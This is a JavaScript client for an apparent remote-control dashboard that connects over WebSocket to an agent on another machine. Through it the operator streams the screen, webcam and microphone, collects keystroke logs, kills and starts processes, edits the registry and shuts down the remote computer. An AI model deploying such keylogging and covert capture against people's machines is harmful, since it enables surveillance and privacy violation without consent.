/* File: script.js */

// --- SAVE IMAGE ---
function saveSnapshot() {
    const img = document.getElementById('screenImg');
    if (img.src && img.style.display !== 'none') {
        const a = document.createElement('a');
        a.href = img.src;
        a.download = 'snapshot_' + Date.now() + '.png';
        a.click();
        showToast("Snapshot Saved!");
    } else {
        showToast("No image to save!");
    }
}

// --- SAVE KEYLOGS ---
function saveKeylogs() {
    const logContent = document.getElementById('logArea').value;
    if (!logContent.trim()) {
        showToast("No logs to save!");
        return;
    }
    const blob = new Blob([logContent], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "keylog_" + Date.now() + ".txt";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast("Keylogs Saved Successfully!");
}

// --- TOAST NOTIFICATION ---
let toastTimeout;
function showToast(msg) {
    const toast = document.getElementById('toast-notification');
    document.getElementById('toast-message').innerText = msg;
    toast.classList.add('show');
    if (toastTimeout) clearTimeout(toastTimeout);
    toastTimeout = setTimeout(() => { toast.classList.remove('show'); }, 3000);
}

// --- RIPPLE EFFECT ---
document.addEventListener('click', function (e) {
    let ripple = document.createElement('div'); ripple.className = 'click-ripple';
    document.body.appendChild(ripple);
    ripple.style.left = (e.pageX - 50) + 'px'; ripple.style.top = (e.pageY - 50) + 'px';
    setTimeout(() => { ripple.remove(); }, 500);
});

// --- METEOR ANIMATION ---
function spawnMeteor() {
    const container = document.getElementById('meteor-container');
    const meteor = document.createElement('div'); meteor.className = 'meteor';
    const startX = Math.random() * window.innerWidth;
    const startY = Math.random() * (window.innerHeight * 0.4);
    meteor.style.left = startX + 'px'; meteor.style.top = startY + 'px';
    meteor.style.transform = 'rotate(-45deg)';
    const duration = Math.random() * 1 + 0.8;
    meteor.style.animation = `meteor-shoot ${duration}s linear forwards`;
    container.appendChild(meteor);
    setTimeout(() => { meteor.remove(); }, duration * 1000);
}
setInterval(spawnMeteor, 500);

// --- WEBSOCKET LOGIC ---
let ws;
let isStreaming = false;
let isWebcam = false;

// --- SCREEN RECORDER VARIABLES ---
let mediaRecorder;
let recordedChunks = [];
let isRecording = false;

// --- WEBCAM RECORDER VARIABLES ---
let mediaRecorderWebcam;
let recordedChunksWebcam = [];
let isWebcamRecording = false;

// --- AUDIO VARIABLES (AUTO START) ---
let isAudioEnabled = false;
let audioCtx = null;
let audioDest = null; // Destination để record âm thanh
let nextStartTime = 0;

function connect() {
    const addressInput = document.getElementById('txtIP').value.trim();
    let wsUrl;

    if (addressInput.startsWith("ws://") || addressInput.startsWith("wss://")) {
        wsUrl = addressInput;
    }
    else if (addressInput.includes(":")) {
        wsUrl = `ws://${addressInput}`;
    }
    else {
        wsUrl = `ws://${addressInput}:5656`;
    }

    ws = new WebSocket(wsUrl);
    ws.binaryType = "blob";

    ws.onopen = () => {
        document.getElementById('statusText').innerText = "STATUS: CONNECTED";
        document.getElementById('statusText').style.color = "#ff33cc";
        document.getElementById('statusText').style.textShadow = "0 0 10px #ff33cc";

        document.getElementById('btnConnect').style.display = 'none';
        document.getElementById('btnDisconnect').style.display = 'block';

        ws.send("GET_APPS");
        showToast("System Connected Successfully");
    };
    ws.onclose = () => {
        document.getElementById('statusText').innerText = "STATUS: DISCONNECTED";
        document.getElementById('statusText').style.color = "#aaa";
        document.getElementById('statusText').style.textShadow = "none";

        document.getElementById('btnConnect').style.display = 'block';
        document.getElementById('btnDisconnect').style.display = 'none';

        stopStream();
        stopWebcam();
        // Reset Audio
        isAudioEnabled = false;

        showToast("Disconnected from Server");
    };
    ws.onmessage = (event) => {
        const data = event.data;
        if (data instanceof Blob) {
            const imgUrl = URL.createObjectURL(data);

            if (isWebcam) {
                const img = document.getElementById('webcamImg');
                img.src = imgUrl;
                img.style.display = 'block';
                document.getElementById('webcamOffline').style.display = 'none';

                img.onload = () => {
                    if (isWebcamRecording) {
                        const canvas = document.getElementById('webcamCanvas');
                        const ctx = canvas.getContext('2d');
                        canvas.width = img.naturalWidth;
                        canvas.height = img.naturalHeight;
                        ctx.drawImage(img, 0, 0);
                    }
                    URL.revokeObjectURL(imgUrl);
                    if (isWebcam) ws.send("WEBCAM");
                }
            } else if (isStreaming) {
                const img = document.getElementById('screenImg');
                img.src = imgUrl;
                img.style.display = 'block';
                document.getElementById('screenOffline').style.display = 'none';

                img.onload = () => {
                    if (isRecording) {
                        const canvas = document.getElementById('recordingCanvas');
                        const ctx = canvas.getContext('2d');
                        canvas.width = img.naturalWidth;
                        canvas.height = img.naturalHeight;
                        ctx.drawImage(img, 0, 0);
                    }
                    URL.revokeObjectURL(imgUrl);
                    if (isStreaming) ws.send("STREAM");
                }
            } else {
                const img = document.getElementById('screenImg');
                img.src = imgUrl;
                img.style.display = 'block';
                document.getElementById('screenOffline').style.display = 'none';
                document.getElementById('btnSaveSnap').style.display = 'inline-block';
                showToast("Snapshot Received!");
            }
        } else if (typeof data === 'string') {
            if (data.startsWith("LISTAPP|")) renderProcessTable(data.substring(8));
            else if (data.startsWith("LIST_REAL_APPS|")) renderAppTable(data.substring(15));
            else if (data.startsWith("LOG|")) document.getElementById('logArea').value += data.substring(4) + "\n";
            else if (data.startsWith("MSG|")) showToast(data.split('|')[1]);
            else if (data.startsWith("REG_RESP|")) document.getElementById('regResult').value += data + "\n";
            else if (data.startsWith("AUDIO|")) processAudio(data.substring(6));
        }
    };
}

function disconnect() { if (ws) ws.close(); }
function sendCommand(cmd) { if (ws && ws.readyState === 1) ws.send(cmd); else showToast("Error: Not connected!"); }

function renderAppTable(dataStr) {
    const tbody = document.getElementById('appTableBody'); tbody.innerHTML = "";
    dataStr.split(';').forEach(row => {
        if (!row) return; const p = row.split(','); if (p.length >= 3) {
            tbody.innerHTML += `<tr><td class="fw-bold text-white">${p[2]}</td><td>${p[0]}</td><td class="text-secondary">${p[1]}</td><td class="text-end"><button class='btn-hatom btn-hatom-danger' onclick="sendCommand('KILLID|${p[1]}')">CLOSE</button></td></tr>`;
        }
    });
}
function renderProcessTable(dataStr) {
    const tbody = document.getElementById('processTableBody'); tbody.innerHTML = "";
    dataStr.split(';').forEach(row => {
        if (!row) return; const p = row.split(','); if (p.length >= 2) {
            tbody.innerHTML += `<tr><td>${p[0]}</td><td class="text-secondary">${p[1]}</td><td class="text-end"><button class='btn-hatom' onclick="fillKill('${p[1]}')">SELECT</button></td></tr>`;
        }
    });
}
function fillKill(id) { document.getElementById('txtKillID').value = id; }
function killProcess() { const id = document.getElementById('txtKillID').value; if (id) sendCommand("KILLID|" + id); }

function startProcess() {
    const name = document.getElementById('txtAppName').value;
    if (name) sendCommand("STARTID|" + name);
    else showToast("Please enter App Name!");
}

function startProcessTab() {
    const name = document.getElementById('txtProcName').value;
    if (name) {
        sendCommand("STARTID|" + name);
        showToast("Sent Start Command: " + name);
        document.getElementById('txtProcName').value = '';
    }
    else showToast("Please enter Process Name!");
}

// --- SNAPSHOT FUNCTION ---
function takeSnapshot() {
    isStreaming = false;
    // Ẩn/Hiện nút
    document.getElementById('btnRecordStream').style.display = 'none';
    document.getElementById('btnSaveSnap').style.display = 'inline-block';

    sendCommand('TAKE');
}

// --- SCREEN STREAM FUNCTIONS ---
function startStream() {
    isStreaming = true;
    isWebcam = false;

    document.getElementById('webcamImg').style.display = 'none';
    document.getElementById('webcamOffline').style.display = 'flex';
    document.getElementById('btnSaveSnap').style.display = 'none';

    // Hiện nút RECORD khi Stream
    document.getElementById('btnRecordStream').style.display = 'inline-block';

    // --- TỰ ĐỘNG BẬT AUDIO ---
    if (!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        audioDest = audioCtx.createMediaStreamDestination();
    }
    if (audioCtx.state === 'suspended') {
        audioCtx.resume();
    }
    isAudioEnabled = true;

    sendCommand("STREAM");
    sendCommand("START_AUDIO");
}

function stopStream() {
    isStreaming = false;

    if (isRecording) {
        toggleRecording();
    }

    const img = document.getElementById('screenImg');
    img.style.display = 'none';
    img.src = "";
    document.getElementById('screenOffline').style.display = 'flex';

    // Ẩn các nút hành động khi Stop
    document.getElementById('btnRecordStream').style.display = 'none';
    document.getElementById('btnSaveSnap').style.display = 'none';

    // --- TẮT AUDIO ---
    isAudioEnabled = false;
    sendCommand("STOP_AUDIO");
}

// --- WEBCAM FUNCTIONS (AUTO AUDIO) ---
function startWebcam() {
    isWebcam = true;
    isStreaming = false;
    document.getElementById('screenImg').style.display = 'none';
    document.getElementById('screenOffline').style.display = 'flex';

    // Hiện nút RECORD khi bật Cam
    document.getElementById('btnRecordWebcam').style.display = 'inline-block';

    // --- TỰ ĐỘNG BẬT AUDIO (User Gesture is active here) ---
    if (!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        audioDest = audioCtx.createMediaStreamDestination();
    }
    if (audioCtx.state === 'suspended') {
        audioCtx.resume();
    }
    isAudioEnabled = true;

    // Gửi lệnh bật cả Webcam và Audio
    sendCommand("WEBCAM");
    sendCommand("START_AUDIO");
    console.log("Webcam & Audio Auto-Started");
}

function stopWebcam() {
    isWebcam = false;
    if (isWebcamRecording) {
        toggleWebcamRecording();
    }
    // Ẩn nút RECORD khi tắt Cam
    document.getElementById('btnRecordWebcam').style.display = 'none';

    // --- TỰ ĐỘNG TẮT AUDIO ---
    isAudioEnabled = false;
    sendCommand("STOP_AUDIO");
    sendCommand("STOP_CAM");

    const img = document.getElementById('webcamImg');
    img.style.display = 'none';
    img.src = "";
    document.getElementById('webcamOffline').style.display = 'flex';
}

// --- AUDIO PROCESSING ---
function processAudio(base64Data) {
    if (!isAudioEnabled || !audioCtx) return;

    const binaryString = window.atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    audioCtx.decodeAudioData(bytes.buffer, function (buffer) {
        const source = audioCtx.createBufferSource();
        source.buffer = buffer;

        // Kết nối ra loa (để nghe)
        source.connect(audioCtx.destination);

        // Kết nối ra destination (để record)
        if (audioDest) {
            source.connect(audioDest);
        }

        if (nextStartTime < audioCtx.currentTime) {
            nextStartTime = audioCtx.currentTime;
        }
        source.start(nextStartTime);
        nextStartTime += buffer.duration;
    }, function (e) {
        console.log("Error decoding audio: " + e.err);
    });
}

// --- WEBCAM VIDEO RECORDING (AUTO MIX AUDIO) ---
function toggleWebcamRecording() {
    const btn = document.getElementById('btnRecordWebcam');
    const canvas = document.getElementById('webcamCanvas');

    if (!isWebcamRecording) {
        try {
            const stream = canvas.captureStream(30);
            let finalStream = stream;

            // Tự động trộn Audio nếu có
            if (audioDest && isAudioEnabled) {
                const audioTracks = audioDest.stream.getAudioTracks();
                if (audioTracks.length > 0) {
                    finalStream = new MediaStream([...stream.getTracks(), ...audioTracks]);
                    console.log("Audio track added to recorder");
                }
            }

            mediaRecorderWebcam = new MediaRecorder(finalStream, { mimeType: 'video/webm' });

            recordedChunksWebcam = [];
            mediaRecorderWebcam.ondataavailable = function (e) {
                if (e.data.size > 0) {
                    recordedChunksWebcam.push(e.data);
                }
            };

            mediaRecorderWebcam.onstop = function () {
                const blob = new Blob(recordedChunksWebcam, { type: 'video/webm' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                a.download = 'webcam_record_' + Date.now() + '.webm';
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                }, 100);
                showToast("Webcam Video Saved!");
            };

            mediaRecorderWebcam.start();
            isWebcamRecording = true;
            btn.innerText = "STOP RECORDING";
            btn.classList.add("btn-recording");
            showToast("Webcam Recording Started...");
        } catch (err) {
            console.error(err);
            showToast("Error: Browser does not support Canvas recording.");
        }

    } else {
        mediaRecorderWebcam.stop();
        isWebcamRecording = false;
        btn.innerText = "START RECORD";
        btn.classList.remove("btn-recording");
    }
}

// --- VIDEO RECORDING (SCREEN) ---
function toggleRecording() {
    const btn = document.getElementById('btnRecordStream');
    const canvas = document.getElementById('recordingCanvas');

    if (!isRecording) {
        try {
            const stream = canvas.captureStream(30);
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

            recordedChunks = [];
            mediaRecorder.ondataavailable = function (e) {
                if (e.data.size > 0) {
                    recordedChunks.push(e.data);
                }
            };

            mediaRecorder.onstop = function () {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.style.display = 'none';
                a.href = url;
                a.download = 'screen_record_' + Date.now() + '.webm';
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                }, 100);
                showToast("Video Recorded Successfully!");
            };

            mediaRecorder.start();
            isRecording = true;
            btn.innerText = "STOP RECORDING";
            btn.classList.add("btn-recording");
            showToast("Recording Started...");
        } catch (err) {
            console.error(err);
            showToast("Error: Browser does not support Canvas recording.");
        }

    } else {
        mediaRecorder.stop();
        isRecording = false;
        btn.innerText = "START RECORD";
        btn.classList.remove("btn-recording");
    }
}

// --- CUSTOM MODAL LOGIC ---
let pendingAction = null;

function openModal(action) {
    const modal = document.getElementById('customModal');
    const title = document.getElementById('modalTitle');
    const text = document.getElementById('modalText');
    const confirmBtn = document.getElementById('btnModalConfirm');

    pendingAction = action;
    modal.classList.add('active');

    if (action === 'shutdown') {
        title.innerText = "DANGER ZONE";
        title.style.color = "#ff3b5a";
        text.innerText = "Are you sure you want to SHUTDOWN the remote machine?\nThis action cannot be undone and connection will be lost.";
        confirmBtn.style.backgroundColor = "#ff3b5a";
        confirmBtn.style.color = "#fff";
    } else if (action === 'reboot') {
        title.innerText = "SYSTEM REBOOT";
        title.style.color = "#ccff00";
        text.innerText = "Are you sure you want to REBOOT the system?\nThe connection will be temporarily interrupted.";
        confirmBtn.style.backgroundColor = "#ccff00";
        confirmBtn.style.color = "#000";
    }
}

function closeModal() {
    const modal = document.getElementById('customModal');
    modal.classList.remove('active');
    pendingAction = null;
}

function confirmAction() {
    if (pendingAction === 'shutdown') {
        sendCommand('SHUTDOWN');
    } else if (pendingAction === 'reboot') {
        sendCommand('REBOOT');
    }
    closeModal();
}

function sendRegistry() { const cmd = `REG_EDIT|${document.getElementById('regAction').value}|${document.getElementById('regLink').value}|${document.getElementById('regName').value}|${document.getElementById('regValue').value}|${document.getElementById('regType').value}`; sendCommand(cmd); }